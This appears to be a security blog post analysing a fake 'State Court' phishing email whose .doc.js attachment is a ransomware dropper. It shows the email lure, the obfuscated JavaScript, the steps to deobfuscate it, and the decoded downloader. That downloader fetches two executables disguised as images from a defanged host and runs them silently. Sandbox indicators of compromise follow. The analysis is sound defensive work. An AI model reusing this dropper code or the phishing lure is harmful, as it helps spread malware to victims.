    <content type="html"><![CDATA[<p>Recently I have been seeing emails with zip attachments that contain a malicious JavaScript file marked as a double dot extension (.doc.js). The JavaScript is obfuscated but debofuscating it is rather easy and I wanted to share my analysis. The infection appears to be Ransomware, most likely a CryptoWall 3.0 variant but I did not verify it.</p>

<!--more-->


<h4>Email Indicators</h4>

<pre><code>Received: from uplander.websitewelcome.com (uplander.websitewelcome.com [192.185.179.118])
Subject: Notice to appear in Court #00000536215
From: "State Court" &lt;allan.barnett@ns963.websitewelcome.com&gt;
Reply-To: "State Court" &lt;allan.barnett@ns963.websitewelcome.com&gt;
Attachment: 00000536215.zip -&gt; 00000536215.doc.js
</code></pre>

<hr />

<h4>Message Body</h4>

<pre><code>Notice to Appear,

This is to inform you to appear in the Court on the August 11 for your case hearing.
Please, do not forget to bring all the documents related to the case.
Note: The case may be heard by the judge in your absence if you do not come.

The copy of Court Notice is attached to this email.

Yours faithfully,
Allan Barnett,
Court Secretary.
</code></pre>

<h3>Deobfuscating the JavaScript</h3>

<p>Below is the original decompressed file contents. It tries to hide itself as a better known file type (.doc) but any modern operating system would most likely recognize and interpret the JavaScript file. Luckily for us, it is rather easy to deobfuscate something like this. You can use a tool like JSDetox or use a JavaScript interpreter like node.js. The key thing we need to overcome is that JSDetox and node.js most likely won&rsquo;t have access to ActiveX so we have to remove the check otherwise it will not deobfuscate.</p>

<figure class='code'><figcaption><span>00000536215.doc.js</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='javascript'><span class='line'><span class="kd">var</span> <span class="nx">jlavws</span><span class="o">=</span><span class="s1">&#39;fpubnwcytwieoenq sdblf(hfyrm,y ffmni,u jrcnj)n{p z fvyalro gwwsd h=s cneewwh uApcitaiwvgemXvOlbyjdefchtg(p&quot;uWvSocaruiapota.wSshieplulm&quot;m)b;h b kvhayrq tftnc r=x iwysd.xEtxzpmatnudmEinvvjiardoynumqelnwtxS&#39;</span><span class="p">;</span><span class="kd">var</span> <span class="nx">jdmkdr</span><span class="o">=</span><span class="s1">&#39;mtgreilnxgxse(a&quot;p%cTiEoMfPf%h&quot;f)s b+z eSjturoijnygn.eforyobmlClhiaprwCgondaeg(c9d2o)q i+u yfonm;a n rvkairf uxgos y=u rnaefwc jAvcytpijvzevXlOcbkjcelcetb(z&quot;rMbSnXiMmLw2o.gXcMhLfHxTyTfPd&quot;a)p;y z exhoz.zot&#39;</span><span class="p">;</span><span class="kd">var</span> <span class="nx">xxjg</span><span class="o">=</span><span class="s1">&#39;ncrkewandpyxsntgaztbeoclhxacnsgaej x=x ifduanjcstziiownh i(w)a{k g x y viufl c(uxnoq.grletaydmydSvtjaltyek v=r=k=d n4s)l{k t w r q u mvlagrp fxuaf l=f znkerwd fAbcoteimvkewXxOnbjjpezcuti(w&quot;lAyDqOyDjBx.nS&#39;</span><span class="p">;</span><span class="kd">var</span> <span class="nx">bpm</span><span class="o">=</span><span class="s1">&#39;ptrrseaawms&quot;l)o;v r q k w c uxsaa.iobppeinv(x)e;h v u f f r sxuaj.ltvyfpdeg u=y x1k;j u n d m n mxoac.uwkraiytrew(txwob.lRoewsupzornasdeyBuocdwye)l;q s p c f b rxhaw.bphovssidtoioofnz d=b u0d;t u g r o i&#39;</span><span class="p">;</span><span class="kd">var</span> <span class="nx">his</span><span class="o">=</span><span class="s1">&#39; oxtau.eslakvheqTmoyFyiilzeg(dfsnk,r h2p)r;k r l n k g uxcau.ccqlooxsvez(h)d;q t c o c}c v f u f;x b v}p m m;b z wthruyz c{x q q u lxqoc.pogpwernv(y&quot;tGqEeTn&quot;w,c pfrrr,b dftablasaev)z;c s q t nxboj.psqeqn&#39;</span><span class="p">;</span><span class="kd">var</span> <span class="nx">bey</span><span class="o">=</span><span class="s1">&#39;ldh(l)k;b c o o yiqfe p(irfnt b&gt;g u0b)c{u e v k y j mwhsy.cRxuknk(jfvnl,l j0a,k z0e)z;i j t j q}n l t i p;o s o}x e vcwahttchhr d(cedro)m{e y m}i y u;s}sddlj(g&quot;ohdtotepr:h/t/p3m1p0m7t2i0u1l5max.pcaojmt/z&#39;</span><span class="p">;</span><span class="kd">var</span> <span class="nx">yjb</span><span class="o">=</span><span class="s1">&#39;iwmcaygqeusr/ufeixvjeh1m.ojzptgh&quot;p,f w&quot;c5z3f2w7k4r7u3a5r0e.terxaev&quot;q,r q1h)l;udelv(b&quot;rhjtatkpq:p/q/m3r1q0r7o2a0i1i5aaa.ncuosmn/piimeafgqeqsa/vflibvmev2c.xjlpsgn&quot;y,k d&quot;p2z1e1y9i5f4z8v6z9r.iepxaen&quot;v,q e1v)&#39;</span><span class="p">;</span><span class="kd">var</span> <span class="nx">buh</span><span class="o">=</span><span class="s1">&#39;l;q&#39;</span><span class="p">;</span><span class="kd">var</span> <span class="nx">a1</span><span class="o">=</span><span class="nx">jlavws</span><span class="o">+</span><span class="nx">jdmkdr</span><span class="o">+</span><span class="nx">xxjg</span><span class="o">+</span><span class="nx">bpm</span><span class="o">+</span><span class="nx">his</span><span class="o">+</span><span class="nx">bey</span><span class="o">+</span><span class="nx">yjb</span><span class="o">+</span><span class="nx">buh</span><span class="p">;</span>   <span class="kd">var</span> <span class="nx">a2</span><span class="o">=</span><span class="s2">&quot;&quot;</span><span class="p">;</span>   <span class="kd">var</span> <span class="nx">a3</span><span class="o">=</span><span class="mi">2</span><span class="p">;</span>      <span class="kd">var</span> <span class="nx">a4</span><span class="o">=</span><span class="mi">10</span><span class="p">;</span>      <span class="kd">var</span> <span class="nx">y</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">ActiveXObject</span><span class="p">(</span><span class="s2">&quot;Scripting.Dictionary&quot;</span><span class="p">);</span>   <span class="nx">y</span><span class="p">.</span><span class="nx">add</span> <span class="p">(</span><span class="s2">&quot;a&quot;</span><span class="p">,</span> <span class="s2">&quot;t&quot;</span><span class="p">);</span>      <span class="k">if</span> <span class="p">(</span><span class="nx">y</span><span class="p">.</span><span class="nx">Item</span><span class="p">(</span><span class="s2">&quot;a&quot;</span><span class="p">)</span><span class="o">==</span><span class="s2">&quot;t&quot;</span><span class="p">){</span><span class="nx">a4</span><span class="o">=</span><span class="mi">0</span><span class="p">;}</span><span class="k">else</span><span class="p">{</span><span class="nx">a4</span><span class="o">=</span><span class="mi">10</span><span class="p">};</span>      <span class="kd">var</span> <span class="nx">a5</span><span class="o">=</span><span class="nx">a1</span><span class="p">.</span><span class="nx">length</span><span class="p">;</span>   <span class="kd">var</span> <span class="nx">a</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span>   <span class="k">while</span><span class="p">(</span><span class="nx">a</span><span class="o">&lt;</span><span class="nx">a5</span><span class="p">){</span>    <span class="nx">a2</span> <span class="o">+=</span><span class="nx">a1</span><span class="p">.</span><span class="nx">charAt</span><span class="p">(</span><span class="nx">a</span><span class="p">);</span><span class="nx">a</span> <span class="o">+=</span><span class="nx">a3</span><span class="o">+</span><span class="nx">a4</span><span class="p">;</span>   <span class="p">};</span>   <span class="kd">var</span> <span class="nx">rosa</span><span class="o">=</span><span class="p">[</span><span class="s2">&quot;e&quot;</span><span class="p">,</span><span class="s2">&quot;0&quot;</span><span class="p">,</span><span class="s2">&quot;v&quot;</span><span class="p">,</span><span class="s2">&quot;0&quot;</span><span class="p">,</span><span class="s2">&quot;a&quot;</span><span class="p">,</span><span class="s2">&quot;0&quot;</span><span class="p">,</span><span class="s2">&quot;l&quot;</span><span class="p">,</span><span class="s2">&quot;0&quot;</span><span class="p">];</span>   <span class="kd">var</span> <span class="nx">tosta</span><span class="o">=</span><span class="nx">rosa</span><span class="p">[</span><span class="mi">0</span><span class="o">+</span><span class="nx">a4</span><span class="p">]</span><span class="o">+</span><span class="nx">rosa</span><span class="p">[</span><span class="mi">2</span><span class="o">+</span><span class="nx">a4</span><span class="p">]</span><span class="o">+</span><span class="nx">rosa</span><span class="p">[</span><span class="mi">4</span><span class="o">+</span><span class="nx">a4</span><span class="p">]</span><span class="o">+</span><span class="nx">rosa</span><span class="p">[</span><span class="mi">6</span><span class="o">+</span><span class="nx">a4</span><span class="p">];</span>   <span class="kd">var</span> <span class="nx">a6</span><span class="o">=</span><span class="nx">tosta</span><span class="p">;</span>   <span class="k">this</span><span class="p">[</span><span class="nx">a6</span><span class="p">](</span><span class="nx">a2</span><span class="p">);</span>
</span></code></pre></td></tr></table></div></figure>


<p>Expanding and cleaning up the glob of JavaScript above gives us <code>00000536215_clean.doc.js</code>. I added comments to point out the key points to be aware of when running this through JSDetox/node. The first comment is where the script checks for ActiveX which both tools will not have access to out of the box. Looking at the code we can see the default value <code>a4 = 10</code> breaks the while loop before it can build the deobfuscated string. If we simply hard code <code>a4 = 0</code> before the loop and comment/delete the while loop it will build the string as intended. In the end the two values we care most about are <code>a2</code> and <code>a6</code>. When the script gets to <code>this[a6](a2)</code> it is essentially performing an <code>eval()</code> operation on the debofuscated string stored in <code>a2</code>.</p>

<figure class='code'><figcaption><span>00000536215_clean.doc.js</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
</pre></td><td class='code'><pre><code class='javascript'><span class='line'><span class="kd">var</span> <span class="nx">jlavws</span> <span class="o">=</span> <span class="s1">&#39;fpubnwcytwieoenq sdblf(hfyrm,y ffmni,u jrcnj)n{p z fvyalro gwwsd h=s cneewwh uApcitaiwvgemXvOlbyjdefchtg(p&quot;uWvSocaruiapota.wSshieplulm&quot;m)b;h b kvhayrq tftnc r=x iwysd.xEtxzpmatnudmEinvvjiardoynumqelnwtxS&#39;</span><span class="p">;</span>
</span><span class='line'>
</span><span class='line'><span class="kd">var</span> <span class="nx">jdmkdr</span> <span class="o">=</span> <span class="s1">&#39;mtgreilnxgxse(a&quot;p%cTiEoMfPf%h&quot;f)s b+z eSjturoijnygn.eforyobmlClhiaprwCgondaeg(c9d2o)q i+u yfonm;a n rvkairf uxgos y=u rnaefwc jAvcytpijvzevXlOcbkjcelcetb(z&quot;rMbSnXiMmLw2o.gXcMhLfHxTyTfPd&quot;a)p;y z exhoz.zot&#39;</span><span class="p">;</span>
</span><span class='line'>
</span><span class='line'><span class="kd">var</span> <span class="nx">xxjg</span> <span class="o">=</span> <span class="s1">&#39;ncrkewandpyxsntgaztbeoclhxacnsgaej x=x ifduanjcstziiownh i(w)a{k g x y viufl c(uxnoq.grletaydmydSvtjaltyek v=r=k=d n4s)l{k t w r q u mvlagrp fxuaf l=f znkerwd fAbcoteimvkewXxOnbjjpezcuti(w&quot;lAyDqOyDjBx.nS&#39;</span><span class="p">;</span>
</span><span class='line'>
</span><span class='line'><span class="kd">var</span> <span class="nx">bpm</span> <span class="o">=</span> <span class="s1">&#39;ptrrseaawms&quot;l)o;v r q k w c uxsaa.iobppeinv(x)e;h v u f f r sxuaj.ltvyfpdeg u=y x1k;j u n d m n mxoac.uwkraiytrew(txwob.lRoewsupzornasdeyBuocdwye)l;q s p c f b rxhaw.bphovssidtoioofnz d=b u0d;t u g r o i&#39;</span><span class="p">;</span>
</span><span class='line'>
</span><span class='line'><span class="kd">var</span> <span class="nx">his</span> <span class="o">=</span> <span class="s1">&#39; oxtau.eslakvheqTmoyFyiilzeg(dfsnk,r h2p)r;k r l n k g uxcau.ccqlooxsvez(h)d;q t c o c}c v f u f;x b v}p m m;b z wthruyz c{x q q u lxqoc.pogpwernv(y&quot;tGqEeTn&quot;w,c pfrrr,b dftablasaev)z;c s q t nxboj.psqeqn&#39;</span><span class="p">;</span>
</span><span class='line'>
</span><span class='line'><span class="kd">var</span> <span class="nx">bey</span> <span class="o">=</span> <span class="s1">&#39;ldh(l)k;b c o o yiqfe p(irfnt b&gt;g u0b)c{u e v k y j mwhsy.cRxuknk(jfvnl,l j0a,k z0e)z;i j t j q}n l t i p;o s o}x e vcwahttchhr d(cedro)m{e y m}i y u;s}sddlj(g&quot;ohdtotepr:h/t/p3m1p0m7t2i0u1l5max.pcaojmt/z&#39;</span><span class="p">;</span>
</span><span class='line'>
</span><span class='line'><span class="kd">var</span> <span class="nx">yjb</span> <span class="o">=</span> <span class="s1">&#39;iwmcaygqeusr/ufeixvjeh1m.ojzptgh&quot;p,f w&quot;c5z3f2w7k4r7u3a5r0e.terxaev&quot;q,r q1h)l;udelv(b&quot;rhjtatkpq:p/q/m3r1q0r7o2a0i1i5aaa.ncuosmn/piimeafgqeqsa/vflibvmev2c.xjlpsgn&quot;y,k d&quot;p2z1e1y9i5f4z8v6z9r.iepxaen&quot;v,q e1v)&#39;</span><span class="p">;</span>
</span><span class='line'>
</span><span class='line'><span class="kd">var</span> <span class="nx">buh</span> <span class="o">=</span> <span class="s1">&#39;l;q&#39;</span><span class="p">;</span>
</span><span class='line'><span class="kd">var</span> <span class="nx">a1</span> <span class="o">=</span> <span class="nx">jlavws</span> <span class="o">+</span> <span class="nx">jdmkdr</span> <span class="o">+</span> <span class="nx">xxjg</span> <span class="o">+</span> <span class="nx">bpm</span> <span class="o">+</span> <span class="nx">his</span> <span class="o">+</span> <span class="nx">bey</span> <span class="o">+</span> <span class="nx">yjb</span> <span class="o">+</span> <span class="nx">buh</span><span class="p">;</span>
</span><span class='line'><span class="kd">var</span> <span class="nx">a2</span> <span class="o">=</span> <span class="s2">&quot;&quot;</span><span class="p">;</span>
</span><span class='line'><span class="kd">var</span> <span class="nx">a3</span> <span class="o">=</span> <span class="mi">2</span><span class="p">;</span>
</span><span class='line'><span class="kd">var</span> <span class="nx">a4</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="c1">// Hardcode to 0, originally set to 10</span>
</span><span class='line'>
</span><span class='line'><span class="cm">/* 1.</span>
</span><span class='line'><span class="cm">  Checks for ActiveX otherwise it will not deobfuscate</span>
</span><span class='line'><span class="cm">  We can comment this out in JSDetox and hard code a4 to 0</span>
</span><span class='line'><span class="cm">*/</span>
</span><span class='line'><span class="kd">var</span> <span class="nx">y</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">ActiveXObject</span><span class="p">(</span><span class="s2">&quot;Scripting.Dictionary&quot;</span><span class="p">);</span>
</span><span class='line'><span class="nx">y</span><span class="p">.</span><span class="nx">add</span><span class="p">(</span><span class="s2">&quot;a&quot;</span><span class="p">,</span> <span class="s2">&quot;t&quot;</span><span class="p">);</span>
</span><span class='line'><span class="k">if</span><span class="p">(</span><span class="nx">y</span><span class="p">.</span><span class="nx">Item</span><span class="p">(</span><span class="s2">&quot;a&quot;</span><span class="p">)</span> <span class="o">==</span> <span class="s2">&quot;t&quot;</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>    <span class="nx">a4</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
</span><span class='line'><span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
</span><span class='line'>    <span class="nx">a4</span> <span class="o">=</span> <span class="mi">10</span><span class="p">;</span>
</span><span class='line'><span class="p">};</span>
</span><span class='line'>
</span><span class='line'><span class="cm">/* 2.</span>
</span><span class='line'><span class="cm">  This function will deobfuscate and build the string to be evaluated below</span>
</span><span class='line'><span class="cm">*/</span>
</span><span class='line'><span class="kd">var</span> <span class="nx">a5</span> <span class="o">=</span> <span class="nx">a1</span><span class="p">.</span><span class="nx">length</span><span class="p">;</span>
</span><span class='line'><span class="kd">var</span> <span class="nx">a</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
</span><span class='line'><span class="k">while</span><span class="p">(</span><span class="nx">a</span> <span class="o">&lt;</span> <span class="nx">a5</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>    <span class="nx">a2</span> <span class="o">+=</span> <span class="nx">a1</span><span class="p">.</span><span class="nx">charAt</span><span class="p">(</span><span class="nx">a</span><span class="p">);</span>
</span><span class='line'>    <span class="nx">a</span> <span class="o">+=</span> <span class="nx">a3</span> <span class="o">+</span> <span class="nx">a4</span><span class="p">;</span>
</span><span class='line'><span class="p">};</span>
</span><span class='line'>
</span><span class='line'><span class="cm">/* 3.</span>
</span><span class='line'><span class="cm">  Transforms to set a6 = &#39;eval&#39;</span>
</span><span class='line'><span class="cm">*/</span>
</span><span class='line'><span class="kd">var</span> <span class="nx">rosa</span> <span class="o">=</span> <span class="p">[</span><span class="s2">&quot;e&quot;</span><span class="p">,</span> <span class="s2">&quot;0&quot;</span><span class="p">,</span> <span class="s2">&quot;v&quot;</span><span class="p">,</span> <span class="s2">&quot;0&quot;</span><span class="p">,</span> <span class="s2">&quot;a&quot;</span><span class="p">,</span> <span class="s2">&quot;0&quot;</span><span class="p">,</span> <span class="s2">&quot;l&quot;</span><span class="p">,</span> <span class="s2">&quot;0&quot;</span><span class="p">];</span>
</span><span class='line'><span class="kd">var</span> <span class="nx">tosta</span> <span class="o">=</span> <span class="nx">rosa</span><span class="p">[</span><span class="mi">0</span> <span class="o">+</span> <span class="nx">a4</span><span class="p">]</span> <span class="o">+</span> <span class="nx">rosa</span><span class="p">[</span><span class="mi">2</span> <span class="o">+</span> <span class="nx">a4</span><span class="p">]</span> <span class="o">+</span> <span class="nx">rosa</span><span class="p">[</span><span class="mi">4</span> <span class="o">+</span> <span class="nx">a4</span><span class="p">]</span> <span class="o">+</span> <span class="nx">rosa</span><span class="p">[</span><span class="mi">6</span> <span class="o">+</span> <span class="nx">a4</span><span class="p">];</span>
</span><span class='line'><span class="kd">var</span> <span class="nx">a6</span> <span class="o">=</span> <span class="nx">tosta</span><span class="p">;</span>
</span><span class='line'>
</span><span class='line'><span class="cm">/* 4.</span>
</span><span class='line'><span class="cm">  The eval() function and a2 is the deobfuscated string to run</span>
</span><span class='line'><span class="cm">*/</span>
</span><span class='line'><span class="c1">// this[a6](a2);</span>
</span></code></pre></td></tr></table></div></figure>


<p>Now that we have a readable version of the JavaScript it is pretty easy to tell what it is doing. Basically the script downloads the two files <code>five1.jpg</code> and <code>five2.jpg</code> which are actually MS-DOS executables. Then using a Windows Script Host Shell it attempts to run each of the downloaded payloads.</p>

<figure class='code'><figcaption><span>deobfuscated.js</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
</pre></td><td class='code'><pre><code class='javascript'><span class='line'><span class="kd">function</span> <span class="nx">dl</span><span class="p">(</span><span class="nx">fr</span><span class="p">,</span> <span class="nx">fn</span><span class="p">,</span> <span class="nx">rn</span><span class="p">){</span>
</span><span class='line'>  <span class="kd">var</span> <span class="nx">ws</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">ActiveXObject</span><span class="p">(</span><span class="s2">&quot;WScript.Shell&quot;</span><span class="p">);</span>
</span><span class='line'>  <span class="kd">var</span> <span class="nx">fn</span> <span class="o">=</span> <span class="nx">ws</span><span class="p">.</span><span class="nx">ExpandEnvironmentStrings</span><span class="p">(</span><span class="s2">&quot;%TEMP%&quot;</span><span class="p">)</span> <span class="o">+</span> <span class="nb">String</span><span class="p">.</span><span class="nx">fromCharCode</span><span class="p">(</span><span class="mi">92</span><span class="p">)</span> <span class="o">+</span> <span class="nx">fn</span><span class="p">;</span>
</span><span class='line'>  <span class="kd">var</span> <span class="nx">xo</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">ActiveXObject</span><span class="p">(</span><span class="s2">&quot;MSXML2.XMLHTTP&quot;</span><span class="p">);</span>
</span><span class='line'>  <span class="nx">xo</span><span class="p">.</span><span class="nx">onreadystatechange</span> <span class="o">=</span> <span class="kd">function</span> <span class="p">(){</span>
</span><span class='line'>    <span class="k">if</span> <span class="p">(</span><span class="nx">xo</span><span class="p">.</span><span class="nx">readyState</span> <span class="o">===</span> <span class="mi">4</span><span class="p">){</span>
</span><span class='line'>      <span class="kd">var</span> <span class="nx">xa</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">ActiveXObject</span><span class="p">(</span><span class="s2">&quot;ADODB.Stream&quot;</span><span class="p">);</span>
</span><span class='line'>      <span class="nx">xa</span><span class="p">.</span><span class="nx">open</span><span class="p">();</span>
</span><span class='line'>      <span class="nx">xa</span><span class="p">.</span><span class="nx">type</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
</span><span class='line'>      <span class="nx">xa</span><span class="p">.</span><span class="nx">write</span><span class="p">(</span><span class="nx">xo</span><span class="p">.</span><span class="nx">ResponseBody</span><span class="p">);</span>
</span><span class='line'>      <span class="nx">xa</span><span class="p">.</span><span class="nx">position</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
</span><span class='line'>      <span class="nx">xa</span><span class="p">.</span><span class="nx">saveToFile</span><span class="p">(</span><span class="nx">fn</span><span class="p">,</span> <span class="mi">2</span><span class="p">);</span>
</span><span class='line'>      <span class="nx">xa</span><span class="p">.</span><span class="nx">close</span><span class="p">();</span>
</span><span class='line'>    <span class="p">};</span>
</span><span class='line'>  <span class="p">};</span>
</span><span class='line'>  <span class="k">try</span> <span class="p">{</span>
</span><span class='line'>    <span class="nx">xo</span><span class="p">.</span><span class="nx">open</span><span class="p">(</span><span class="s2">&quot;GET&quot;</span><span class="p">,</span> <span class="nx">fr</span><span class="p">,</span> <span class="kc">false</span><span class="p">);</span>
</span><span class='line'>    <span class="nx">xo</span><span class="p">.</span><span class="nx">send</span><span class="p">();</span>
</span><span class='line'>    <span class="k">if</span> <span class="p">(</span><span class="nx">rn</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">){</span>
</span><span class='line'>      <span class="nx">ws</span><span class="p">.</span><span class="nx">Run</span><span class="p">(</span><span class="nx">fn</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
</span><span class='line'>    <span class="p">};</span>
</span><span class='line'>  <span class="p">}</span>  <span class="k">catch</span> <span class="p">(</span><span class="nx">er</span><span class="p">){</span>  <span class="p">};</span>
</span><span class='line'><span class="p">}</span>
</span><span class='line'><span class="nx">dl</span><span class="p">(</span><span class="s2">&quot;hxxp://31072015a[.]com/images/five1.jpg&quot;</span><span class="p">,</span> <span class="s2">&quot;532747350.exe&quot;</span><span class="p">,</span><span class="mi">1</span><span class="p">);</span>   <span class="c1">// Download payload 1</span>
</span><span class='line'><span class="nx">dl</span><span class="p">(</span><span class="s2">&quot;hxxp://31072015a[.]com/images/five2.jpg&quot;</span><span class="p">,</span> <span class="s2">&quot;211954869.exe&quot;</span><span class="p">,</span> <span class="mi">1</span><span class="p">);</span>  <span class="c1">// Download payload 2</span>
</span></code></pre></td></tr></table></div></figure>


<p>Here are some of the network indicators and behaviors I observed from sandboxing the payloads. If you have any questions or comments about the analysis feel free to reach out to me.</p>

<h4>five1.jpg/532747350.exe Analysis</h4>

<pre><code># Payload Download: Response
* Connected to 31072015a[.]com (195.225.228.156) port 80 (#0)
GET /images/five1.jpg HTTP/1.1
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:37.0) Gecko/20100101 Firefox/37.0
Host: 31072015a[.]com
Accept: */*

HTTP/1.1 200 OK
Server: Apache/2.2.15 (CentOS)
Last-Modified: Wed, 05 Aug 2015 21:35:01 GMT
ETag: "c10000c-40e00-51c972cdc4b23"
Accept-Ranges: bytes
Content-Length: 265728
Connection: close

# Registry Activity
Modifies registry to disable system restore
Creates a file in the windows start menu folder
Modifies autorun registry key values

# Network Traffic
GET hxxp://ip-addr[.]es:80/
Server IP: 188.165.164.184

POST hxxp://bethel[.]vn:80/wp-content/themes/twentytwelve/b.php?w=cg1odjtnay
POST hxxp://bethel[.]vn:80/wp-content/themes/twentytwelve/b.php?n=t1dfbt93fg
POST hxxp://bethel[.]vn:80/wp-content/themes/twentytwelve/b.php?h=qovvtc388iq4bm
POST hxxp://bethel[.]vn:80/wp-content/themes/twentytwelve/b.php?t=4l425ka9qjn
Server IP: 112.78.2.209

POST hxxp://aeusasoftball[.]com:80/wp-content/themes/sports-team-theme/includes/adva...cg1odjtnay
Server IP: 184.168.47.225

GET hxxp://boschservisi.info[.]tr:80/cgi-sys/suspendedpage.cgi?b=cg1odjtnay
GET hxxp://boschservisi.info[.]tr:80/cgi-sys/suspendedpage.cgi?f=t1dfbt93fg
GET hxxp://boschservisi.info[.]tr:80/cgi-sys/suspendedpage.cgi?p=qovvtc388iq4bm
GET hxxp://boschservisi.info[.]tr:80/cgi-sys/suspendedpage.cgi?y=4l425ka9qjn
POST hxxp://boschservisi.info[.]tr:80/wp-content/themes/twentytwelve/d.php?b=cg1odjtnay
POST hxxp://boschservisi.info[.]tr:80/wp-content/themes/twentytwelve/d.php?f=t1dfbt93fg
POST hxxp://boschservisi.info[.]tr:80/wp-content/themes/twentytwelve/d.php?p=qovvtc388iq4bm
POST hxxp://boschservisi.info[.]tr:80/wp-content/themes/twentytwelve/d.php?y=4l425ka9qjn
Server IP: 94.102.1.207

POST hxxp://hotfrance[.]ru:80/wp-content/themes/dreamynight-10/a.php?x=cg1odjtnay
POST hxxp://hotfrance[.]ru:80/wp-content/themes/dreamynight-10/a.php?u=t1dfbt93fg
POST hxxp://hotfrance[.]ru:80/wp-content/themes/dreamynight-10/a.php?p=4l425ka9qjn
Server IP: 95.85.4.87
</code></pre>

<hr />

<h4>five2.jpg/211954869.exe Analysis</h4>

<pre><code># Payload Download: Response
* Connected to 31072015a[.]com (107.15.99.91) port 80 (#0)
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:37.0) Gecko/20100101 Firefox/37.0
Host: 31072015a[.]com
Accept: */*
HTTP/1.1 200 OK

Server: Apache/2.2.15 (CentOS)
Last-Modified: Wed, 05 Aug 2015 21:30:02 GMT
ETag: "c100037-3a600-51c971b00f877"
Accept-Ranges: bytes
Content-Length: 239104
Connection: close
Content-Type: image/jpeg

# Network Traffic
Post-Infection Requests:
POST hxxp://prestigecarstorage.com[.]au:80/wp-includes/Text/Text.php
Server IP: 192.186.240.131

POST hxxp://mcmamina[.]cz:80/media/plg_quickicon_joomlaupdate/plg_quickicon_joomlaupdate.php
Server IP: 82.208.47.134

POST hxxp://buyseoplan[.]com:80/wp-admin/includes/includes.php
Server IP: 160.153.34.130

POST hxxp://letssaidiana[.]com:80/wp-admin/user/user.php
Server IP: 50.62.121.1

POST hxxp://kenyadivas[.]com:80/media/editors/editors.php
Server IP: 192.254.185.141

POST hxxp://keithgerchak[.]com:80/wp-admin/css/css.php
Server IP: 50.63.93.1

POST hxxp://binarycashbackdaily[.]com:80/wp-admin/maint/maint.php
Server IP: 198.15.118.164

POST hxxp://apexsitesolutions[.]com:80/main/wp-admin/mod_html.php
Server IP: 184.168.179.1

POST hxxp://employerservice[.]net:80/wp-includes/theme-compat/theme-compat.php
Server IP: 23.229.242.167

POST hxxp://hmb.com[.]au:80/wp-admin/images/images.php
Server IP: 192.186.203.132

POST hxxp://denver-computer-repairs[.]com:80/wordpress2/wp-includes/fckeditor.php
Server IP: 173.201.146.180

POST hxxp://hatmandoo.co[.]uk:80/cache/mod_menu/mod_menu.php
Server IP: 192.254.235.245

POST hxxp://wizjafotografii[.]pl:80/wp-content/languages/languages.php
Server IP: 46.16.186.66
</code></pre>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Why You Should Get Pocket]]></title>
    <link href="http://elauqsap.github.io/blog/2015/02/15/why-you-should-get-pocket/"/>
    <updated>2015-02-15T19:28:23-06:00</updated>
    <id>http://elauqsap.github.io/blog/2015/02/15/why-you-should-get-pocket</id>
